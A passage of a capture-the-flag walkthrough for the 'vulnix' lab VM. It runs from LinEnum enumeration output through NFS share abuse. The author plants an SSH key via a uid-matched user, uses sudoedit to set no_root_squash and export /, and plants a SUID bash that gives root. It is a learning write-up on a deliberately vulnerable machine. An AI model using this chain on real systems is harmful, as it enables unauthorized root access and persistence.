          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:50 errors:0 dropped:0 overruns:0 frame:0
          TX packets:50 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:3952 (3.9 KB)  TX bytes:3952 (3.9 KB)


ARP history:
? (192.168.118.254) at 00:50:56:fe:e2:bc [ether] on eth0
? (192.168.118.186) at 00:0c:29:34:4b:b0 [ether] on eth0
? (192.168.118.2) at 00:50:56:f4:18:88 [ether] on eth0


Nameserver(s):
nameserver 192.168.118.2


Default route:
default         192.168.118.2   0.0.0.0         UG    100    0        0 eth0


Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:35051           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:41549           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:79              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:51382           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:47553           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:43746           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -               
tcp        0      0 192.168.118.188:22      192.168.118.186:41308   ESTABLISHED -               
tcp6       0      0 :::110                  :::*                    LISTEN      -               
tcp6       0      0 :::143                  :::*                    LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::39768                :::*                    LISTEN      -               
tcp6       0      0 :::25                   :::*                    LISTEN      -               
tcp6       0      0 :::44249                :::*                    LISTEN      -               
tcp6       0      0 :::2049                 :::*                    LISTEN      -               
tcp6       0      0 :::993                  :::*                    LISTEN      -               
tcp6       0      0 :::59042                :::*                    LISTEN      -               
tcp6       0      0 :::995                  :::*                    LISTEN      -               
tcp6       0      0 :::39334                :::*                    LISTEN      -               
tcp6       0      0 :::38472                :::*                    LISTEN      -               


Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 127.0.0.1:934           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:47837           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:2049            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:33802           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:58382           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:782             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:56599           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:48196           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
udp6       0      0 :::37837                :::*                                -               
udp6       0      0 :::2049                 :::*                                -               
udp6       0      0 :::58120                :::*                                -               
udp6       0      0 :::782                  :::*                                -               
udp6       0      0 :::53084                :::*                                -               
udp6       0      0 :::51549                :::*                                -               
udp6       0      0 :::111                  :::*                                -               
udp6       0      0 :::44915                :::*                                -               


### SERVICES #############################################
Running processes:
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.3   3512  1948 ?        Ss   18:05   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    18:05   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    18:05   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    18:05   0:00 [kworker/u:0]
root         6  0.0  0.0      0     0 ?        S    18:05   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S    18:05   0:00 [watchdog/0]
root         8  0.0  0.0      0     0 ?        S<   18:05   0:00 [cpuset]
root         9  0.0  0.0      0     0 ?        S<   18:05   0:00 [khelper]
root        10  0.0  0.0      0     0 ?        S    18:05   0:00 [kdevtmpfs]
root        11  0.0  0.0      0     0 ?        S<   18:05   0:00 [netns]
root        12  0.0  0.0      0     0 ?        S    18:05   0:00 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    18:05   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S<   18:05   0:00 [kintegrityd]
root        15  0.0  0.0      0     0 ?        S<   18:05   0:00 [kblockd]
root        16  0.0  0.0      0     0 ?        S<   18:05   0:00 [ata_sff]
root        17  0.0  0.0      0     0 ?        S    18:05   0:00 [khubd]
root        18  0.0  0.0      0     0 ?        S<   18:05   0:00 [md]
root        21  0.0  0.0      0     0 ?        S    18:05   0:00 [khungtaskd]
root        22  0.0  0.0      0     0 ?        S    18:05   0:00 [kswapd0]
root        23  0.0  0.0      0     0 ?        SN   18:05   0:00 [ksmd]
root        24  0.0  0.0      0     0 ?        S    18:05   0:00 [fsnotify_mark]
root        25  0.0  0.0      0     0 ?        S    18:05   0:00 [ecryptfs-kthrea]
root        26  0.0  0.0      0     0 ?        S<   18:05   0:00 [crypto]
root        34  0.0  0.0      0     0 ?        S<   18:05   0:00 [kthrotld]
root        37  0.0  0.0      0     0 ?        S    18:05   0:00 [scsi_eh_0]
root        38  0.0  0.0      0     0 ?        S    18:05   0:00 [scsi_eh_1]
root        39  0.0  0.0      0     0 ?        S    18:05   0:00 [kworker/u:3]
root        60  0.0  0.0      0     0 ?        S<   18:06   0:00 [devfreq_wq]
root       175  0.0  0.0      0     0 ?        S<   18:06   0:00 [mpt_poll_0]
root       178  0.0  0.0      0     0 ?        S<   18:06   0:00 [mpt/0]
root       202  0.0  0.0      0     0 ?        S    18:06   0:00 [scsi_eh_2]
root       215  0.0  0.0      0     0 ?        S<   18:06   0:00 [kdmflush]
root       223  0.0  0.0      0     0 ?        S<   18:06   0:00 [kdmflush]
root       237  0.0  0.0      0     0 ?        S    18:06   0:00 [jbd2/dm-0-8]
root       238  0.0  0.0      0     0 ?        S<   18:06   0:00 [ext4-dio-unwrit]
root       434  0.0  0.1   2816   608 ?        S    18:06   0:00 upstart-udev-bridge --daemon
root       437  0.0  0.2   3072  1220 ?        Ss   18:06   0:00 /sbin/udevd --daemon
root       534  0.0  0.0      0     0 ?        S<   18:06   0:00 [kpsmoused]
root       610  0.0  0.0   2828   356 ?        S    18:06   0:00 upstart-socket-bridge --daemon
root       648  0.0  0.1   2744  1008 ?        Ss   18:06   0:00 rpcbind -w
root       675  0.0  0.1   3068   852 ?        S    18:06   0:00 /sbin/udevd --daemon
root       676  0.0  0.1   3068   844 ?        S    18:06   0:00 /sbin/udevd --daemon
root       707  0.0  0.0      0     0 ?        S<   18:06   0:00 [rpciod]
root       727  0.0  0.0      0     0 ?        S<   18:06   0:00 [nfsiod]
root       747  0.0  0.0   2892   396 ?        Ss   18:06   0:00 rpc.idmapd
102        748  0.0  0.1   3240   888 ?        Ss   18:06   0:00 dbus-daemon --system --fork --activation=upstart
syslog     751  0.0  0.4  30916  2336 ?        Sl   18:06   0:01 rsyslogd -c5
statd      758  0.0  0.2   2984  1356 ?        Ss   18:06   0:00 rpc.statd -L
root       799  0.0  0.1   2908   812 ?        Ss   18:06   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -1 eth0
root       821  0.0  0.4   6664  2412 ?        Ss   18:06   0:00 /usr/sbin/sshd -D
root       904  0.0  0.1   4612   836 tty4     Ss+  18:06   0:00 /sbin/getty -8 38400 tty4
root       909  0.0  0.1   4612   844 tty5     Ss+  18:06   0:00 /sbin/getty -8 38400 tty5
root       920  0.0  0.1   4612   844 tty2     Ss+  18:06   0:00 /sbin/getty -8 38400 tty2
root       921  0.0  0.1   4612   844 tty3     Ss+  18:06   0:00 /sbin/getty -8 38400 tty3
root       924  0.0  0.1   4612   844 tty6     Ss+  18:06   0:00 /sbin/getty -8 38400 tty6
root       927  0.0  0.1   2412   716 ?        S    18:06   0:00 /usr/sbin/inetutils-inetd
root       945  0.0  0.2   2992  1184 ?        Ss   18:06   0:00 /usr/sbin/dovecot -F -c /etc/dovecot/dovecot.conf
root       948  0.0  0.1   2156   608 ?        Ss   18:06   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root       950  0.0  0.1   2600   768 ?        Ss   18:06   0:00 cron
daemon     951  0.0  0.0   2452   348 ?        Ss   18:06   0:00 atd
dovecot    977  0.0  0.1   2704   836 ?        S    18:06   0:00 dovecot/anvil
root       978  0.0  0.1   2700   928 ?        S    18:06   0:00 dovecot/log
whoopsie   980  0.0  0.7  24440  3764 ?        Ssl  18:06   0:00 whoopsie
root      1003  0.0  0.0      0     0 ?        S    18:06   0:00 [lockd]
root      1004  0.0  0.0      0     0 ?        S<   18:06   0:00 [nfsd4]
root      1005  0.0  0.0      0     0 ?        S<   18:06   0:00 [nfsd4_callbacks]
root      1006  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1007  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1008  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1009  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1010  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1011  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1012  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1013  0.0  0.0      0     0 ?        S    18:06   0:00 [nfsd]
root      1017  0.0  0.3   3568  1756 ?        Ss   18:06   0:00 /usr/sbin/rpc.mountd --manage-gids
root      1121  0.0  0.2   4560  1464 ?        Ss   18:06   0:00 /usr/lib/postfix/master
root      1164  0.0  0.1   4612   840 tty1     Ss+  18:06   0:00 /sbin/getty -8 38400 tty1
root      1167  0.0  0.0      0     0 ?        S    18:06   0:00 [flush-252:0]
postfix   1409  0.0  0.2   4628  1348 ?        S    18:20   0:00 qmgr -l -t fifo -u
postfix   1449  0.0  0.5   7164  2604 ?        S    18:50   0:00 tlsmgr -l -t unix -u -c
root     14329  0.0  0.6   9716  3180 ?        Ss   21:13   0:00 sshd: user [priv]   
user     14451  0.0  0.3   9716  1560 ?        S    21:13   0:01 sshd: user@pts/0    
user     14452  0.0  1.2   9756  6204 pts/0    Ss   21:13   0:00 -bash
root     14802  0.0  0.0      0     0 ?        S    21:38   0:00 [kworker/0:0]
postfix  14805  0.0  0.2   4580  1416 ?        S    21:39   0:00 pickup -l -t fifo -u -c
root     14888  0.0  0.0      0     0 ?        S    21:43   0:00 [kworker/0:2]
root     14902  0.0  0.0      0     0 ?        S    21:48   0:00 [kworker/0:1]
user     14909  0.1  0.2   5224  1368 pts/0    S+   21:49   0:00 /bin/bash ./LinEnum.sh
postfix  15055  0.0  0.3   4672  1528 ?        S    21:49   0:00 cleanup -z -t unix -u -c
postfix  15056  0.0  0.2   4588  1336 ?        S    21:49   0:00 trivial-rewrite -n rewrite -t unix -u -c
postfix  15057  0.0  0.4   4804  2036 ?        S    21:49   0:00 local -t unix
user     15226  0.0  0.1   5216   620 pts/0    S+   21:49   0:00 /bin/bash ./LinEnum.sh
user     15227  0.0  0.2   4924  1156 pts/0    R+   21:49   0:00 ps aux


Process binaries & associated permissions (from above list):
900K -rwxr-xr-x 1 root root 900K Apr  3  2012 /bin/bash
 28K -rwxr-xr-x 2 root root  27K Mar 30  2012 /sbin/getty
188K -rwxr-xr-x 1 root root 186K Apr 26  2012 /sbin/init
176K -rwxr-xr-x 1 root root 174K Jul 19  2012 /sbin/udevd
 40K -rwxr-xr-x 1 root root  38K Jul 30  2012 /usr/lib/postfix/master
 64K -rwxr-xr-x 1 root root  62K Jun 29  2012 /usr/sbin/dovecot
 64K -rwxr-xr-x 1 root root  63K Jan  3  2012 /usr/sbin/inetutils-inetd
260K -rwxr-xr-x 1 root root 257K Apr  9  2012 /usr/sbin/rpc.mountd
516K -rwxr-xr-x 1 root root 516K Apr  2  2012 /usr/sbin/sshd


Contents of /etc/inetd.conf:
# /etc/inetd.conf:  see inetd(8) for further informations.
#
# Internet superserver configuration database
#
#
# Lines starting with "#:LABEL:" or "#<off>#" should not
# be changed unless you know what you are doing!
#
# If you want to disable an entry so it isn't touched during
# package updates just comment it out with a single '#' character.
#
# Packages should modify this file by using update-inetd(8)
#
# <service_name> <sock_type> <proto> <flags> <user> <server_path> <args>
#
#:INTERNAL: Internal services
#discard		stream	tcp	nowait	root	internal
#discard		dgram	udp	wait	root	internal
#daytime		stream	tcp	nowait	root	internal
#time		stream	tcp	nowait	root	internal

#:STANDARD: These are standard services.

#:BSD: Shell, login, exec and talk are BSD protocols.
shell		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rshd
login		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rlogind
exec		stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/in.rexecd

#:MAIL: Mail, news and uucp services.

#:INFO: Info services
finger		stream	tcp	nowait	nobody	/usr/sbin/tcpd	/usr/sbin/in.fingerd

#:BOOT: TFTP service is provided primarily for booting.  Most sites
#       run this only on machines acting as "boot servers."

#:RPC: RPC based services

#:HAM-RADIO: amateur-radio services

#:OTHER: Other services


The related inetd binary permissions:
-rwxr-xr-x 1 root root  9928 May  9  2010 /usr/sbin/in.fingerd
-rwxr-xr-x 1 root root  9968 Jun 26  2010 /usr/sbin/in.rexecd
-rwxr-xr-x 1 root root 18268 Jun 26  2010 /usr/sbin/in.rlogind
-rwxr-xr-x 1 root root 18580 Jun 26  2010 /usr/sbin/in.rshd


/etc/init.d/ binary permissions:
total 160
drwxr-xr-x  2 root root 4096 Sep  2  2012 .
drwxr-xr-x 91 root root 4096 May 21 12:06 ..
lrwxrwxrwx  1 root root   21 Dec  8  2011 acpid -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4596 Apr 12  2012 apparmor
lrwxrwxrwx  1 root root   21 Jul 27  2012 apport -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Oct 25  2011 atd -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 2444 Jul 26  2012 bootlogd
lrwxrwxrwx  1 root root   21 Apr 19  2012 console-setup -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jun 19  2012 cron -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Feb 22  2012 dbus -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 30  2012 dmesg -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1242 Dec 13  2011 dns-clean
lrwxrwxrwx  1 root root   21 Jun 29  2012 dovecot -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 14  2012 friendly-recovery -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1105 May 17  2012 grub-common
lrwxrwxrwx  1 root root   21 Apr  9  2012 gssd -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1329 Jul 26  2012 halt
lrwxrwxrwx  1 root root   21 May 26  2011 hostname -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 30  2012 hwclock -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Mar 30  2012 hwclock-save -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  9  2012 idmapd -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1925 Nov  4  2011 inetutils-inetd
lrwxrwxrwx  1 root root   21 Feb  4  2012 irqbalance -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 1293 Jul 26  2012 killprocs
-rw-r--r--  1 root root    0 Sep  2  2012 .legacy-bootordering
lrwxrwxrwx  1 root root   21 Nov 20  2011 module-init-tools -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 2797 Feb 13  2012 networking
lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface-container -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  5  2012 network-interface-security -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4796 Apr  9  2012 nfs-kernel-server
-rwxr-xr-x  1 root root  882 Jul 26  2012 ondemand
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-log -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-splash -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-stop -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr 13  2012 plymouth-upstart-bridge -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 May 31  2012 portmap -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 May 31  2012 portmap-wait -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 7355 Jul 30  2012 postfix
-rwxr-xr-x  1 root root  561 Feb  4  2011 pppd-dns
lrwxrwxrwx  1 root root   21 Dec 12  2011 procps -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 8635 Jul 26  2012 rc
-rwxr-xr-x  1 root root  801 Jul 26  2012 rc.local
-rwxr-xr-x  1 root root  117 Jul 26  2012 rcS
-rw-r--r--  1 root root 2427 Jul 26  2012 README
-rwxr-xr-x  1 root root  639 Jul 26  2012 reboot
lrwxrwxrwx  1 root root   21 Jul 21  2012 resolvconf -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 May 31  2012 rpcbind-boot -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4395 Nov  8  2011 rsync
lrwxrwxrwx  1 root root   21 Mar 30  2012 rsyslog -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jun  6  2011 screen-cleanup -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 4321 Jul 26  2012 sendsigs
lrwxrwxrwx  1 root root   21 Apr 19  2012 setvtrgb -> /lib/init/upstart-job
-rwxr-xr-x  1 root root  590 Jul 26  2012 single
-rw-r--r--  1 root root 4304 Jul 26  2012 skeleton
-rwxr-xr-x  1 root root 4371 Apr  2  2012 ssh
lrwxrwxrwx  1 root root   21 Apr  9  2012 statd -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  9  2012 statd-mounting -> /lib/init/upstart-job
-rwxr-xr-x  1 root root  567 Jul 26  2012 stop-bootlogd
-rwxr-xr-x  1 root root 1143 Jul 26  2012 stop-bootlogd-single
-rwxr-xr-x  1 root root  700 May 23  2012 sudo
lrwxrwxrwx  1 root root   21 Jul 19  2012 udev -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udev-fallback-graphics -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udev-finish -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udevmonitor -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Jul 19  2012 udevtrigger -> /lib/init/upstart-job
lrwxrwxrwx  1 root root   21 Apr  5  2012 ufw -> /lib/init/upstart-job
-rwxr-xr-x  1 root root 2800 Jul 26  2012 umountfs
-rwxr-xr-x  1 root root 2211 Jul 26  2012 umountnfs.sh
-rwxr-xr-x  1 root root 2926 Jul 26  2012 umountroot
-rwxr-xr-x  1 root root 1985 Jul 26  2012 urandom
lrwxrwxrwx  1 root root   21 Apr 18  2012 whoopsie -> /lib/init/upstart-job


### SOFTWARE #############################################
Sudo version:
Sudo version 1.8.3p1


### INTERESTING FILES ####################################
Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget


Can we read/write sensitive files:
-rw-r--r-- 1 root root 1312 Sep  2  2012 /etc/passwd
-rw-r--r-- 1 root root 720 Sep  2  2012 /etc/group
-rw-r--r-- 1 root root 665 Sep  2  2012 /etc/profile
-rw-r----- 1 root shadow 1111 Sep  2  2012 /etc/shadow


rhost config file(s) and file contents:
-rw------- 1 user user 7 Sep  2  2012 /home/user/.rhosts
+ user


Hosts.equiv file details and file contents:
-rw-r--r-- 1 root root 117 Jun 26  2010 /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#		    command access to your system .


NFS config details:
-rw-r--r-- 1 root root 420 Sep  2  2012 /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,root_squash)


Can't search *.conf files as no keyword was entered

Can't search *.log files as no keyword was entered

Can't search *.ini files as no keyword was entered

All *.conf files in /etc (recursive 1 level):
-rw-r----- 1 root fuse 216 Oct 18  2011 /etc/fuse.conf
-rw-r--r-- 1 root root 834 Dec 16  2011 /etc/gssapi_mech.conf
-rw-r--r-- 1 root root 144 Sep  2  2012 /etc/kernel-img.conf
-rw-r--r-- 1 root root 839 Apr 10  2012 /etc/insserv.conf
-rw-r--r-- 1 root root 326 Aug 17  2011 /etc/updatedb.conf
-rw-r--r-- 1 root root 956 Mar 30  2012 /etc/mke2fs.conf
-rw-r--r-- 1 root root 552 Feb  9  2012 /etc/pam.conf
-rw-r--r-- 1 root root 350 Sep  2  2012 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 2083 Dec  5  2011 /etc/sysctl.conf
-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
-rw-r--r-- 1 root root 1318 Sep  2  2012 /etc/inetd.conf
-rw-r--r-- 1 root root 2969 Mar 15  2012 /etc/debconf.conf
-rw-r--r-- 1 root root 34 Sep  2  2012 /etc/ld.so.conf
-rw-r--r-- 1 root root 206 Mar 27  2012 /etc/idmapd.conf
-rw-r--r-- 1 root root 4728 May  2  2012 /etc/hdparm.conf
-rw-r--r-- 1 root root 3343 Apr 20  2012 /etc/gai.conf
-rw-r--r-- 1 root root 599 Oct  4  2011 /etc/logrotate.conf
-rw-r--r-- 1 root root 1260 May  2  2011 /etc/ucf.conf
-rw-r--r-- 1 root root 6961 Sep  2  2012 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 92 Apr 19  2012 /etc/host.conf
-rw-r--r-- 1 root root 1263 Mar 30  2012 /etc/rsyslog.conf
-rw-r--r-- 1 root root 475 Apr 19  2012 /etc/nsswitch.conf
-rw-r--r-- 1 root root 321 Mar 30  2012 /etc/blkid.conf
-rw-r--r-- 1 root root 604 Oct 19  2011 /etc/deluser.conf
-rw-r--r-- 1 root root 2981 Sep  2  2012 /etc/adduser.conf


Current user's history files:
-rw------- 1 user user 12 May 21 21:41 /home/user/.bash_history


Any interesting mail in /var/mail:
total 12
drwxrwsr-x  2 root   mail 4096 May 21 21:49 .
drwxr-xr-x 12 root   root 4096 Sep  2  2012 ..
-rw-rw----  1 nobody mail 1656 May 21 21:49 nobody


### SCAN COMPLETE ####################################

user@vulnix:~$ cat .bash_history
whoami
exit
user@vulnix:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,root_squash)

__

The scan turned up the /etc/exports file, looks like the /home/vulnix directory is read/write.  Guess i need to learn more about NFS permissions.

https://serverfault.com/questions/240897/how-to-properly-set-permissions-for-nfs-folder-permission-denied-on-mounting-en

Maybe I need a vulnix user on my machine with a matching uid and guid?  The password file showed 2008 for both.

root@kali:~# useradd -u 2008 -g 2008 vulnix
useradd: group '2008' does not exist
root@kali:~# groupadd -g 2008 vulnix
root@kali:~# useradd -u 2008 -g 2008 vulnix

Still no go.  Wonder if my issue is with using nfspy to mount.

root@kali:/tmp# apt-get install nfs-common

Kali doesn't have NFS in mount by default?  Learn something every day.

root@kali:/tmp# mount -t nfs 192.168.118.188:/home/vulnix /tmp/mnt -nolock

root@kali:/tmp# cp ~/.ssh/id_rsa.pub .

vulnix@kali:/tmp/mnt$ mkdir .ssh
vulnix@kali:/tmp/mnt$ cd .ssh
vulnix@kali:/tmp/mnt/.ssh$ cp ../../id_rsa.pub authorized_keys
vulnix@kali:/tmp/mnt/.ssh$ ls -la
total 12
drwxr-xr-x 2 vulnix vulnix 4096 May 21  2017 .
drwxr-x--- 3 vulnix vulnix 4096 May 21 16:11 ..
-rw-r--r-- 1 vulnix vulnix  391 May 21  2017 authorized_keys

root@kali:~/vulnix# ssh -l vulnix 192.168.118.188
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun May 21 23:16:25 BST 2017

  System load:  0.0              Processes:           88
  Usage of /:   90.7% of 773MB   Users logged in:     0
  Memory usage: 13%              IP address for eth0: 192.168.118.188
  Swap usage:   0%

  => / is using 90.7% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun May 21 23:16:07 2017 from 192.168.118.186
vulnix@vulnix:~$
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports

    vulnix@vulnix:/var/tmp$ cat /etc/exports
    # /etc/exports: the access control list for filesystems which may be exported
    #		to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /home/vulnix	*(rw,no_root_squash)

****

After some research on root_squash I modified the file.  That looks better.  now I just need a way to restart the NFS export or the server and copy over a shell with a suid bit set.

I have to admit that I cheated and look at some walkthroughs.  Turns out the answer is to power cycles the VM, one person claimed to contact the author.  :(  A denial of service on the server would have been a whole lot more fun.

  root@kali:/tmp# cp /bin/bash .
  root@kali:/tmp# chmod 4777 bash


  vulnix@vulnix:~$ ./bash
  -bash: ./bash: cannot execute binary file


Copying bash from my machine doesn't work and i'm not having any luck copying the bash off the server to my machine, changing permissions and copying it back.  BRB, getting a bigger hammer.

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix	*(rw,no_root_squash)
/		*(rw,no_root_squash)

**

root@kali:/tmp# mkdir root
root@kali:/tmp# mount -t nfs 192.168.118.188:/ /tmp/root

root@kali:/tmp/root/bin# chmod 4777 bash


-bash-4.2$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)


Hmm, thought I would be root on login.  Hello Google my old friend, what can you tell me?

-bash-4.2$ bash -p
bash-4.2# id
uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
bash-4.2# cd /root
bash-4.2# ls -la
total 28
drwx------  3 root root 4096 Sep  2  2012 .
drwxr-xr-x 22 root root 4096 Sep  2  2012 ..
-rw-------  1 root root    0 Sep  2  2012 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Sep  2  2012 .cache
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-r--------  1 root root   33 Sep  2  2012 trophy.txt
-rw-------  1 root root  710 Sep  2  2012 .viminfo
bash-4.2# cat  trophy.txt
cc614640424f5bd60ce5d5264899c3be
bash-4.2#
